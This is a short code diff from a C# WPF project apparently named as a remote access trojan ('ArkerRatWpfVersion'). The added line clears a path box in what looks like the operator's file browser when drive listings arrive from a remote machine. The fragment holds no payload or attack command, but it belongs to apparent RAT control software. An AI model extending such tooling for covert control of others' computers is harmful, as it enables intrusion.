@@ -101,6 +101,7 @@ namespace ArkerRatWpfVersion
                 pathSearch.Text = selector;
                 if (data.Contains("§drives§"))
                 {
+                    pathSearch.Text = "";
                     data = data.Replace("§drives§", string.Empty);
                     string[] disks = data.Trim(',').Split(',');
                     foreach (string s in disks)
